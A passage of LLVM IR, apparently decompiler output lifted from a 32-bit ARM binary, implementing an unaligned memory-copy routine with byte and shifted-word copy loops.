  %v1_159a8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_159a8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb133, %bb134
  %v7_159ac = phi i32 [ %v8_159a4, %bb134 ], [ %v5_1599c, %bb133 ]
  %v2_159ac = phi i1 [ %v2_159a8.pre, %bb134 ], [ %v1_159a0, %bb133 ]
  %v1_159ac = phi i1 [ %v1_159a8.pre, %bb134 ], [ %v0_159a0, %bb133 ]
  %v0_159a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_159a8 = xor i1 %v2_159ac, %v1_159ac
  %v4_159a8 = or i1 %v0_159a8, %v3_159a8
  br i1 %v4_159a8, label %.thread120, label %bb135

bb135:                                            ; preds = %.thread119
  %v5_159a8 = load i32, i32* %r1.global-to-local, align 4
  %v6_159a8 = inttoptr i32 %v5_159a8 to i8*
  %v7_159a8 = load i8, i8* %v6_159a8, align 1
  %v8_159a8 = zext i8 %v7_159a8 to i32
  store i32 %v8_159a8, i32* %r3.global-to-local, align 4
  %v10_159a8 = add i32 %v5_159a8, 1
  store i32 %v10_159a8, i32* %r1.global-to-local, align 4
  %v8_159ac = inttoptr i32 %v7_159ac to i8*
  store i8 %v7_159a8, i8* %v8_159ac, align 1
  %v9_159ac = load i32, i32* %r0.global-to-local, align 4
  %v10_159ac = add i32 %v9_159ac, 1
  store i32 %v10_159ac, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb135
  %v2_159b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_159b0, i32* %r0.global-to-local, align 4
  ret i32 %v2_159b0

dec_label_pc_159b4:                               ; preds = %dec_label_pc_15908
  %v1_159b4 = sub nsw i32 4, %v1_15908
  store i32 %v1_159b4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_159b8 = icmp ult i32 %v1_159b4, 2
  store i1 %v8_159b8, i1* %cpsr_n.global-to-local, align 1
  %v9_159b8 = icmp eq i32 %v1_159b4, 2
  store i1 %v9_159b8, i1* %cpsr_z.global-to-local, align 1
  %v1_159bc = inttoptr i32 %v0_158f0 to i8*
  %v2_159bc = load i8, i8* %v1_159bc, align 1
  %v3_159bc = zext i8 %v2_159bc to i32
  store i32 %v3_159bc, i32* %r3.global-to-local, align 4
  %v5_159bc = add i32 %v0_158f0, 1
  store i32 %v5_159bc, i32* @r1, align 4
  %v3_159c0 = inttoptr i32 %v1_158f0 to i8*
  store i8 %v2_159bc, i8* %v3_159c0, align 1
  %v4_159c0 = load i32, i32* @r0, align 4
  %v5_159c0 = add i32 %v4_159c0, 1
  store i32 %v5_159c0, i32* @r0, align 4
  br i1 %v8_159b8, label %.thread11, label %bb136

bb136:                                            ; preds = %dec_label_pc_159b4
  %v6_159c4 = load i32, i32* @r1, align 4
  %v7_159c4 = inttoptr i32 %v6_159c4 to i8*
  %v8_159c4 = load i8, i8* %v7_159c4, align 1
  %v9_159c4 = zext i8 %v8_159c4 to i32
  store i32 %v9_159c4, i32* %r3.global-to-local, align 4
  %v11_159c4 = add i32 %v6_159c4, 1
  store i32 %v11_159c4, i32* @r1, align 4
  %v9_159c8 = inttoptr i32 %v5_159c0 to i8*
  store i8 %v8_159c4, i8* %v9_159c8, align 1
  %v10_159c8 = load i32, i32* @r0, align 4
  %v11_159c8 = add i32 %v10_159c8, 1
  store i32 %v11_159c8, i32* @r0, align 4
  br i1 %v9_159b8, label %.thread11, label %bb137

bb137:                                            ; preds = %bb136
  %v8_159cc = load i32, i32* @r1, align 4
  %v9_159cc = inttoptr i32 %v8_159cc to i8*
  %v10_159cc = load i8, i8* %v9_159cc, align 1
  %v11_159cc = zext i8 %v10_159cc to i32
  store i32 %v11_159cc, i32* %r3.global-to-local, align 4
  %v13_159cc = add i32 %v8_159cc, 1
  store i32 %v13_159cc, i32* @r1, align 4
  %v11_159d0 = inttoptr i32 %v11_159c8 to i8*
  store i8 %v10_159cc, i8* %v11_159d0, align 1
  %v12_159d0 = load i32, i32* @r0, align 4
  %v13_159d0 = add i32 %v12_159d0, 1
  store i32 %v13_159d0, i32* @r0, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb136, %dec_label_pc_159b4, %bb137
  %v0_15a2c75 = phi i32 [ %v11_159c8, %bb136 ], [ %v5_159c0, %dec_label_pc_159b4 ], [ %v13_159d0, %bb137 ]
  %v0_159d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_159d4 = load i32, i32* @ip, align 4
  %v2_159d4 = sub i32 %v0_159d4, %v1_159d4
  store i32 %v2_159d4, i32* %r2.global-to-local, align 4
  %v4_159d4 = xor i32 %v1_159d4, %v0_159d4
  %v5_159d4 = xor i32 %v2_159d4, %v0_159d4
  %v6_159d4 = and i32 %v5_159d4, %v4_159d4
  %v7_159d4 = icmp slt i32 %v6_159d4, 0
  store i1 %v7_159d4, i1* %cpsr_v.global-to-local, align 1
  %v8_159d4 = icmp slt i32 %v2_159d4, 0
  store i1 %v8_159d4, i1* %cpsr_n.global-to-local, align 1
  %v9_159d4 = icmp eq i32 %v0_159d4, %v1_159d4
  store i1 %v9_159d4, i1* %cpsr_z.global-to-local, align 1
  %v5_159d8 = icmp slt i32 %v0_159d4, %v1_159d4
  br i1 %v5_159d8, label %bb131, label %dec_label_pc_159dc

dec_label_pc_159dc:                               ; preds = %.thread11
  %v0_159dc = load i32, i32* @r1, align 4
  %v1_159dc = urem i32 %v0_159dc, 4
  store i32 %v1_159dc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_159dc = icmp eq i32 %v1_159dc, 0
  store i1 %v2_159dc, i1* %cpsr_z.global-to-local, align 1
  %extract.t123 = trunc i32 %v0_159dc to i2
  br i1 %v2_159dc, label %dec_label_pc_15918, label %dec_label_pc_159e4

dec_label_pc_159e4:                               ; preds = %dec_label_pc_15910, %dec_label_pc_159dc
  %v0_15a2c74 = phi i32 [ %v1_158f0, %dec_label_pc_15910 ], [ %v0_15a2c75, %dec_label_pc_159dc ]
  %v0_15ad8 = phi i32 [ %v2_15900, %dec_label_pc_15910 ], [ %v2_159d4, %dec_label_pc_159dc ]
  %v0_159ec.off0 = phi i2 [ %extract.t, %dec_label_pc_15910 ], [ %extract.t123, %dec_label_pc_159dc ]
  %v0_159e4 = phi i32 [ %v0_158f0, %dec_label_pc_15910 ], [ %v0_159dc, %dec_label_pc_159dc ]
  %v1_159e4 = and i32 %v0_159e4, -4
  store i32 %v1_159e4, i32* %r1.global-to-local, align 4
  %v1_159e8 = inttoptr i32 %v1_159e4 to i32*
  %v2_159e8 = load i32, i32* %v1_159e8, align 4
  store i32 %v2_159e8, i32* @lr, align 4
  %v4_159e8 = add i32 %v1_159e4, 4
  store i32 %v4_159e8, i32* %r1.global-to-local, align 4
  %v2_15ad0 = add i32 %v0_15ad8, -12
  %v4_15ad0 = sub i32 11, %v0_15ad8
  %v5_15ad0 = and i32 %v4_15ad0, %v0_15ad8
  %v6_15ad0 = icmp slt i32 %v5_15ad0, 0
  store i1 %v6_15ad0, i1* %cpsr_v.global-to-local, align 1
  %v7_15ad0 = icmp slt i32 %v2_15ad0, 0
  store i1 %v7_15ad0, i1* %cpsr_n.global-to-local, align 1
  %v8_15ad0 = icmp eq i32 %v0_15ad8, 12
  store i1 %v8_15ad0, i1* %cpsr_z.global-to-local, align 1
  %v5_15ad4 = icmp slt i32 %v0_15ad8, 12
  switch i2 %v0_159ec.off0, label %dec_label_pc_159f8 [
    i2 -1, label %dec_label_pc_15ad0
    i2 -2, label %dec_label_pc_15a64
  ]

dec_label_pc_159f8:                               ; preds = %dec_label_pc_159e4
  br i1 %v5_15ad4, label %dec_label_pc_15a44, label %dec_label_pc_15a00

dec_label_pc_15a00:                               ; preds = %dec_label_pc_159f8
  store i32 %v2_15ad0, i32* %r2.global-to-local, align 4
  %v3_15a04 = load i32, i32* @r4, align 4
  store i32 %v3_15a04, i32* %stack_var_-16, align 4
  %v6_15a04 = load i32, i32* @r5, align 4
  store i32 %v6_15a04, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15a08

dec_label_pc_15a08:                               ; preds = %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge, %dec_label_pc_15a00
  %v0_15a2c = phi i32 [ %v12_15a2c, %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge ], [ %v0_15a2c74, %dec_label_pc_15a00 ]
  %v0_15a0c = phi i32 [ %v0_15a0c.pre, %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge ], [ %v4_159e8, %dec_label_pc_15a00 ]
  %v0_15a08 = phi i32 [ %v0_15a08.pre, %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge ], [ %v2_159e8, %dec_label_pc_15a00 ]
  %v3_15a08 = udiv i32 %v0_15a08, 256
  store i32 %v3_15a08, i32* %r3.global-to-local, align 4
  %v1_15a0c = inttoptr i32 %v0_15a0c to i32*
  %v2_15a0c = load i32, i32* %v1_15a0c, align 4
  store i32 %v2_15a0c, i32* %r4.global-to-local, align 4
  %v3_15a0c = add i32 %v0_15a0c, 4
  %v4_15a0c = inttoptr i32 %v3_15a0c to i32*
  %v5_15a0c = load i32, i32* %v4_15a0c, align 4
  store i32 %v5_15a0c, i32* %r5.global-to-local, align 4
  %v6_15a0c = add i32 %v0_15a0c, 8
  %v7_15a0c = inttoptr i32 %v6_15a0c to i32*
  %v8_15a0c = load i32, i32* %v7_15a0c, align 4
  store i32 %v8_15a0c, i32* %ip.global-to-local, align 4
  %v9_15a0c = add i32 %v0_15a0c, 12
  %v10_15a0c = inttoptr i32 %v9_15a0c to i32*
  %v11_15a0c = load i32, i32* %v10_15a0c, align 4
  store i32 %v11_15a0c, i32* @lr, align 4
  %v12_15a0c = add i32 %v0_15a0c, 16
  store i32 %v12_15a0c, i32* %r1.global-to-local, align 4
  %v4_15a10 = mul i32 %v2_15a0c, 16777216
  %v5_15a10 = or i32 %v4_15a10, %v3_15a08
  store i32 %v5_15a10, i32* %r3.global-to-local, align 4
  %v3_15a14 = udiv i32 %v2_15a0c, 256
  %v4_15a18 = mul i32 %v5_15a0c, 16777216
  %v5_15a18 = or i32 %v4_15a18, %v3_15a14
  store i32 %v5_15a18, i32* %r4.global-to-local, align 4
  %v3_15a1c = udiv i32 %v5_15a0c, 256
  %v4_15a20 = mul i32 %v8_15a0c, 16777216
  %v5_15a20 = or i32 %v4_15a20, %v3_15a1c
  store i32 %v5_15a20, i32* %r5.global-to-local, align 4
  %v3_15a24 = udiv i32 %v8_15a0c, 256
  %v4_15a28 = mul i32 %v11_15a0c, 16777216
  %v5_15a28 = or i32 %v4_15a28, %v3_15a24
  store i32 %v5_15a28, i32* @ip, align 4
  %v1_15a2c = inttoptr i32 %v0_15a2c to i32*
  store i32 %v5_15a10, i32* %v1_15a2c, align 4
  %v3_15a2c = add i32 %v0_15a2c, 4
  %v4_15a2c = inttoptr i32 %v3_15a2c to i32*
  %v5_15a2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a2c, i32* %v4_15a2c, align 4
  %v6_15a2c = add i32 %v0_15a2c, 8
  %v7_15a2c = inttoptr i32 %v6_15a2c to i32*
  %v8_15a2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15a2c, i32* %v7_15a2c, align 4
  %v9_15a2c = add i32 %v0_15a2c, 12
  %v10_15a2c = inttoptr i32 %v9_15a2c to i32*
  %v11_15a2c = load i32, i32* @ip, align 4
  store i32 %v11_15a2c, i32* %v10_15a2c, align 4
  %v12_15a2c = add i32 %v0_15a2c, 16
  store i32 %v12_15a2c, i32* @r0, align 4
  %v0_15a30 = load i32, i32* %r2.global-to-local, align 4
  %v2_15a30 = add i32 %v0_15a30, -16
  store i32 %v2_15a30, i32* %r2.global-to-local, align 4
  %v6_15a34 = icmp slt i32 %v0_15a30, 16
  br i1 %v6_15a34, label %dec_label_pc_15a38, label %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge

dec_label_pc_15a08.dec_label_pc_15a08_crit_edge:  ; preds = %dec_label_pc_15a08
  %v0_15a08.pre = load i32, i32* @lr, align 4
  %v0_15a0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a08

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a08
  %v2_15a38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15a38, i32* @r4, align 4
  %v5_15a38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15a38, i32* @r5, align 4
  %v2_15a3c = add i32 %v0_15a30, -4
  store i32 %v2_15a3c, i32* %r2.global-to-local, align 4
  %v4_15a3c = add i32 %v0_15a30, 2147483632
  %v5_15a3c = and i32 %v2_15a3c, %v4_15a3c
  %v6_15a3c = icmp slt i32 %v5_15a3c, 0
  store i1 %v6_15a3c, i1* %cpsr_v.global-to-local, align 1
  %v7_15a3c = icmp slt i32 %v2_15a3c, 0
  store i1 %v7_15a3c, i1* %cpsr_n.global-to-local, align 1
  %v8_15a3c = icmp eq i32 %v2_15a3c, 0
  store i1 %v8_15a3c, i1* %cpsr_z.global-to-local, align 1
  %v5_15a40 = icmp slt i32 %v2_15a30, -12
  br i1 %v5_15a40, label %dec_label_pc_15a5c, label %dec_label_pc_15a44

dec_label_pc_15a44:                               ; preds = %dec_label_pc_15a38, %dec_label_pc_159f8, %dec_label_pc_15a44
  %v1_15a50 = phi i32 [ %v4_15a50, %dec_label_pc_15a44 ], [ %v12_15a2c, %dec_label_pc_15a38 ], [ %v0_15a2c74, %dec_label_pc_159f8 ]
  %v0_15a44 = load i32, i32* @lr, align 4
  %v3_15a44 = udiv i32 %v0_15a44, 256
  store i32 %v3_15a44, i32* %ip.global-to-local, align 4
  %v0_15a48 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a48 = inttoptr i32 %v0_15a48 to i32*
  %v2_15a48 = load i32, i32* %v1_15a48, align 4
  store i32 %v2_15a48, i32* @lr, align 4
  %v4_15a48 = add i32 %v0_15a48, 4
  store i32 %v4_15a48, i32* %r1.global-to-local, align 4
  %v4_15a4c = mul i32 %v2_15a48, 16777216
  %v5_15a4c = or i32 %v4_15a4c, %v3_15a44
  store i32 %v5_15a4c, i32* @ip, align 4
  %v2_15a50 = inttoptr i32 %v1_15a50 to i32*
  store i32 %v5_15a4c, i32* %v2_15a50, align 4
  %v3_15a50 = load i32, i32* @r0, align 4
  %v4_15a50 = add i32 %v3_15a50, 4
  store i32 %v4_15a50, i32* @r0, align 4
  %v0_15a54 = load i32, i32* %r2.global-to-local, align 4
  %v2_15a54 = add i32 %v0_15a54, -4
  store i32 %v2_15a54, i32* %r2.global-to-local, align 4
  %v6_15a58 = icmp slt i32 %v0_15a54, 4
  br i1 %v6_15a58, label %dec_label_pc_15a5c.loopexit, label %dec_label_pc_15a44

dec_label_pc_15a5c.loopexit:                      ; preds = %dec_label_pc_15a44
  %v4_15a54 = sub i32 3, %v0_15a54
  %v5_15a54 = and i32 %v4_15a54, %v0_15a54
  %v6_15a54 = icmp slt i32 %v5_15a54, 0
  %v7_15a54 = icmp slt i32 %v2_15a54, 0
  store i1 %v6_15a54, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15a54, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a5c

dec_label_pc_15a5c:                               ; preds = %dec_label_pc_15a5c.loopexit, %dec_label_pc_15a38
  %v2_1599c111 = phi i32 [ %v4_15a50, %dec_label_pc_15a5c.loopexit ], [ %v12_15a2c, %dec_label_pc_15a38 ]
  %v0_1598c107 = phi i32 [ %v2_15a54, %dec_label_pc_15a5c.loopexit ], [ %v2_15a3c, %dec_label_pc_15a38 ]
  %v0_15a5c = load i32, i32* %r1.global-to-local, align 4
  %v1_15a5c = add i32 %v0_15a5c, -3
  store i32 %v1_15a5c, i32* @r1, align 4
  br label %bb131

dec_label_pc_15a64:                               ; preds = %dec_label_pc_159e4
  br i1 %v5_15ad4, label %dec_label_pc_15ab0, label %dec_label_pc_15a6c

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15a64
  store i32 %v2_15ad0, i32* %r2.global-to-local, align 4
  %v3_15a70 = load i32, i32* @r4, align 4
  store i32 %v3_15a70, i32* %stack_var_-16, align 4
  %v6_15a70 = load i32, i32* @r5, align 4
  store i32 %v6_15a70, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15a74

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a74.dec_label_pc_15a74_crit_edge, %dec_label_pc_15a6c
  %v0_15a98 = phi i32 [ %v12_15a98, %dec_label_pc_15a74.dec_label_pc_15a74_crit_edge ], [ %v0_15a2c74, %dec_label_pc_15a6c ]
  %v0_15a78 = phi i32 [ %v0_15a78.pre, %dec_label_pc_15a74.dec_label_pc_15a74_crit_edge ], [ %v4_159e8, %dec_label_pc_15a6c ]
  %v0_15a74 = phi i32 [ %v0_15a74.pre, %dec_label_pc_15a74.dec_label_pc_15a74_crit_edge ], [ %v2_159e8, %dec_label_pc_15a6c ]
  %v3_15a74 = udiv i32 %v0_15a74, 65536
  store i32 %v3_15a74, i32* %r3.global-to-local, align 4
  %v1_15a78 = inttoptr i32 %v0_15a78 to i32*
  %v2_15a78 = load i32, i32* %v1_15a78, align 4
  store i32 %v2_15a78, i32* %r4.global-to-local, align 4
  %v3_15a78 = add i32 %v0_15a78, 4
  %v4_15a78 = inttoptr i32 %v3_15a78 to i32*
  %v5_15a78 = load i32, i32* %v4_15a78, align 4
  store i32 %v5_15a78, i32* %r5.global-to-local, align 4
  %v6_15a78 = add i32 %v0_15a78, 8
  %v7_15a78 = inttoptr i32 %v6_15a78 to i32*
  %v8_15a78 = load i32, i32* %v7_15a78, align 4
  store i32 %v8_15a78, i32* %ip.global-to-local, align 4
  %v9_15a78 = add i32 %v0_15a78, 12
  %v10_15a78 = inttoptr i32 %v9_15a78 to i32*
  %v11_15a78 = load i32, i32* %v10_15a78, align 4
  store i32 %v11_15a78, i32* @lr, align 4
  %v12_15a78 = add i32 %v0_15a78, 16
  store i32 %v12_15a78, i32* %r1.global-to-local, align 4
  %v4_15a7c = mul i32 %v2_15a78, 65536
  %v5_15a7c = or i32 %v4_15a7c, %v3_15a74
  store i32 %v5_15a7c, i32* %r3.global-to-local, align 4
  %v3_15a80 = udiv i32 %v2_15a78, 65536
  %v4_15a84 = mul i32 %v5_15a78, 65536
  %v5_15a84 = or i32 %v4_15a84, %v3_15a80
  store i32 %v5_15a84, i32* %r4.global-to-local, align 4
  %v3_15a88 = udiv i32 %v5_15a78, 65536
  %v4_15a8c = mul i32 %v8_15a78, 65536
  %v5_15a8c = or i32 %v4_15a8c, %v3_15a88
  store i32 %v5_15a8c, i32* %r5.global-to-local, align 4
  %v3_15a90 = udiv i32 %v8_15a78, 65536
  %v4_15a94 = mul i32 %v11_15a78, 65536
  %v5_15a94 = or i32 %v4_15a94, %v3_15a90
  store i32 %v5_15a94, i32* @ip, align 4
  %v1_15a98 = inttoptr i32 %v0_15a98 to i32*
  store i32 %v5_15a7c, i32* %v1_15a98, align 4
  %v3_15a98 = add i32 %v0_15a98, 4
  %v4_15a98 = inttoptr i32 %v3_15a98 to i32*
  %v5_15a98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a98, i32* %v4_15a98, align 4
  %v6_15a98 = add i32 %v0_15a98, 8
  %v7_15a98 = inttoptr i32 %v6_15a98 to i32*
  %v8_15a98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15a98, i32* %v7_15a98, align 4
  %v9_15a98 = add i32 %v0_15a98, 12
  %v10_15a98 = inttoptr i32 %v9_15a98 to i32*
  %v11_15a98 = load i32, i32* @ip, align 4
  store i32 %v11_15a98, i32* %v10_15a98, align 4
  %v12_15a98 = add i32 %v0_15a98, 16
  store i32 %v12_15a98, i32* @r0, align 4
  %v0_15a9c = load i32, i32* %r2.global-to-local, align 4
  %v2_15a9c = add i32 %v0_15a9c, -16
  store i32 %v2_15a9c, i32* %r2.global-to-local, align 4
  %v6_15aa0 = icmp slt i32 %v0_15a9c, 16
  br i1 %v6_15aa0, label %dec_label_pc_15aa4, label %dec_label_pc_15a74.dec_label_pc_15a74_crit_edge

dec_label_pc_15a74.dec_label_pc_15a74_crit_edge:  ; preds = %dec_label_pc_15a74
  %v0_15a74.pre = load i32, i32* @lr, align 4
  %v0_15a78.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a74
  %v2_15aa4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15aa4, i32* @r4, align 4
  %v5_15aa4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15aa4, i32* @r5, align 4
  %v2_15aa8 = add i32 %v0_15a9c, -4
  store i32 %v2_15aa8, i32* %r2.global-to-local, align 4
  %v4_15aa8 = add i32 %v0_15a9c, 2147483632
  %v5_15aa8 = and i32 %v2_15aa8, %v4_15aa8
  %v6_15aa8 = icmp slt i32 %v5_15aa8, 0
  store i1 %v6_15aa8, i1* %cpsr_v.global-to-local, align 1
  %v7_15aa8 = icmp slt i32 %v2_15aa8, 0
  store i1 %v7_15aa8, i1* %cpsr_n.global-to-local, align 1
  %v8_15aa8 = icmp eq i32 %v2_15aa8, 0
  store i1 %v8_15aa8, i1* %cpsr_z.global-to-local, align 1
  %v5_15aac = icmp slt i32 %v2_15a9c, -12
  br i1 %v5_15aac, label %dec_label_pc_15ac8, label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %dec_label_pc_15aa4, %dec_label_pc_15a64, %dec_label_pc_15ab0
  %v1_15abc = phi i32 [ %v4_15abc, %dec_label_pc_15ab0 ], [ %v12_15a98, %dec_label_pc_15aa4 ], [ %v0_15a2c74, %dec_label_pc_15a64 ]
  %v0_15ab0 = load i32, i32* @lr, align 4
  %v3_15ab0 = udiv i32 %v0_15ab0, 65536
  store i32 %v3_15ab0, i32* %ip.global-to-local, align 4
  %v0_15ab4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ab4 = inttoptr i32 %v0_15ab4 to i32*
  %v2_15ab4 = load i32, i32* %v1_15ab4, align 4
  store i32 %v2_15ab4, i32* @lr, align 4
  %v4_15ab4 = add i32 %v0_15ab4, 4
  store i32 %v4_15ab4, i32* %r1.global-to-local, align 4
  %v4_15ab8 = mul i32 %v2_15ab4, 65536
  %v5_15ab8 = or i32 %v4_15ab8, %v3_15ab0
  store i32 %v5_15ab8, i32* @ip, align 4
  %v2_15abc = inttoptr i32 %v1_15abc to i32*
  store i32 %v5_15ab8, i32* %v2_15abc, align 4
  %v3_15abc = load i32, i32* @r0, align 4
  %v4_15abc = add i32 %v3_15abc, 4
  store i32 %v4_15abc, i32* @r0, align 4
  %v0_15ac0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ac0 = add i32 %v0_15ac0, -4
  store i32 %v2_15ac0, i32* %r2.global-to-local, align 4
  %v6_15ac4 = icmp slt i32 %v0_15ac0, 4
  br i1 %v6_15ac4, label %dec_label_pc_15ac8.loopexit, label %dec_label_pc_15ab0

dec_label_pc_15ac8.loopexit:                      ; preds = %dec_label_pc_15ab0
  %v4_15ac0 = sub i32 3, %v0_15ac0
  %v5_15ac0 = and i32 %v4_15ac0, %v0_15ac0
  %v6_15ac0 = icmp slt i32 %v5_15ac0, 0
  %v7_15ac0 = icmp slt i32 %v2_15ac0, 0
  store i1 %v6_15ac0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15ac0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15ac8

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15ac8.loopexit, %dec_label_pc_15aa4
  %v2_1599c112 = phi i32 [ %v4_15abc, %dec_label_pc_15ac8.loopexit ], [ %v12_15a98, %dec_label_pc_15aa4 ]
  %v0_1598c108 = phi i32 [ %v2_15ac0, %dec_label_pc_15ac8.loopexit ], [ %v2_15aa8, %dec_label_pc_15aa4 ]
  %v0_15ac8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ac8 = add i32 %v0_15ac8, -2
  store i32 %v1_15ac8, i32* @r1, align 4
  br label %bb131

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_159e4
  br i1 %v5_15ad4, label %dec_label_pc_15b1c, label %dec_label_pc_15ad8

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15ad0
  store i32 %v2_15ad0, i32* %r2.global-to-local, align 4
  %v3_15adc = load i32, i32* @r4, align 4
  store i32 %v3_15adc, i32* %stack_var_-16, align 4
  %v6_15adc = load i32, i32* @r5, align 4
  store i32 %v6_15adc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15ae0

dec_label_pc_15ae0:                               ; preds = %dec_label_pc_15ae0.dec_label_pc_15ae0_crit_edge, %dec_label_pc_15ad8
  %v0_15b04 = phi i32 [ %v12_15b04, %dec_label_pc_15ae0.dec_label_pc_15ae0_crit_edge ], [ %v0_15a2c74, %dec_label_pc_15ad8 ]
  %v0_15ae4 = phi i32 [ %v0_15ae4.pre, %dec_label_pc_15ae0.dec_label_pc_15ae0_crit_edge ], [ %v4_159e8, %dec_label_pc_15ad8 ]
  %v0_15ae0 = phi i32 [ %v0_15ae0.pre, %dec_label_pc_15ae0.dec_label_pc_15ae0_crit_edge ], [ %v2_159e8, %dec_label_pc_15ad8 ]
  %v3_15ae0 = udiv i32 %v0_15ae0, 16777216
  store i32 %v3_15ae0, i32* %r3.global-to-local, align 4
  %v1_15ae4 = inttoptr i32 %v0_15ae4 to i32*
  %v2_15ae4 = load i32, i32* %v1_15ae4, align 4
  store i32 %v2_15ae4, i32* %r4.global-to-local, align 4
  %v3_15ae4 = add i32 %v0_15ae4, 4
  %v4_15ae4 = inttoptr i32 %v3_15ae4 to i32*
  %v5_15ae4 = load i32, i32* %v4_15ae4, align 4
  store i32 %v5_15ae4, i32* %r5.global-to-local, align 4
  %v6_15ae4 = add i32 %v0_15ae4, 8
  %v7_15ae4 = inttoptr i32 %v6_15ae4 to i32*
  %v8_15ae4 = load i32, i32* %v7_15ae4, align 4
  store i32 %v8_15ae4, i32* %ip.global-to-local, align 4
  %v9_15ae4 = add i32 %v0_15ae4, 12
  %v10_15ae4 = inttoptr i32 %v9_15ae4 to i32*
  %v11_15ae4 = load i32, i32* %v10_15ae4, align 4
  store i32 %v11_15ae4, i32* @lr, align 4
  %v12_15ae4 = add i32 %v0_15ae4, 16
  store i32 %v12_15ae4, i32* %r1.global-to-local, align 4
  %v4_15ae8 = mul i32 %v2_15ae4, 256
  %v5_15ae8 = or i32 %v4_15ae8, %v3_15ae0
  store i32 %v5_15ae8, i32* %r3.global-to-local, align 4
  %v3_15aec = udiv i32 %v2_15ae4, 16777216
  %v4_15af0 = mul i32 %v5_15ae4, 256
  %v5_15af0 = or i32 %v4_15af0, %v3_15aec
  store i32 %v5_15af0, i32* %r4.global-to-local, align 4
  %v3_15af4 = udiv i32 %v5_15ae4, 16777216
  %v4_15af8 = mul i32 %v8_15ae4, 256
  %v5_15af8 = or i32 %v4_15af8, %v3_15af4
  store i32 %v5_15af8, i32* %r5.global-to-local, align 4
  %v3_15afc = udiv i32 %v8_15ae4, 16777216
  %v4_15b00 = mul i32 %v11_15ae4, 256
  %v5_15b00 = or i32 %v4_15b00, %v3_15afc
  store i32 %v5_15b00, i32* @ip, align 4
  %v1_15b04 = inttoptr i32 %v0_15b04 to i32*
  store i32 %v5_15ae8, i32* %v1_15b04, align 4
  %v3_15b04 = add i32 %v0_15b04, 4
  %v4_15b04 = inttoptr i32 %v3_15b04 to i32*
  %v5_15b04 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15b04, i32* %v4_15b04, align 4
  %v6_15b04 = add i32 %v0_15b04, 8
  %v7_15b04 = inttoptr i32 %v6_15b04 to i32*
  %v8_15b04 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15b04, i32* %v7_15b04, align 4
  %v9_15b04 = add i32 %v0_15b04, 12
  %v10_15b04 = inttoptr i32 %v9_15b04 to i32*
  %v11_15b04 = load i32, i32* @ip, align 4
  store i32 %v11_15b04, i32* %v10_15b04, align 4
  %v12_15b04 = add i32 %v0_15b04, 16
  store i32 %v12_15b04, i32* @r0, align 4
  %v0_15b08 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b08 = add i32 %v0_15b08, -16
  store i32 %v2_15b08, i32* %r2.global-to-local, align 4
  %v6_15b0c = icmp slt i32 %v0_15b08, 16
  br i1 %v6_15b0c, label %dec_label_pc_15b10, label %dec_label_pc_15ae0.dec_label_pc_15ae0_crit_edge

dec_label_pc_15ae0.dec_label_pc_15ae0_crit_edge:  ; preds = %dec_label_pc_15ae0
  %v0_15ae0.pre = load i32, i32* @lr, align 4
  %v0_15ae4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ae0

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15ae0
  %v2_15b10 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15b10, i32* @r4, align 4
  %v5_15b10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15b10, i32* @r5, align 4
  %v2_15b14 = add i32 %v0_15b08, -4
  store i32 %v2_15b14, i32* %r2.global-to-local, align 4
  %v4_15b14 = add i32 %v0_15b08, 2147483632
  %v5_15b14 = and i32 %v2_15b14, %v4_15b14
  %v6_15b14 = icmp slt i32 %v5_15b14, 0
  store i1 %v6_15b14, i1* %cpsr_v.global-to-local, align 1
  %v7_15b14 = icmp slt i32 %v2_15b14, 0
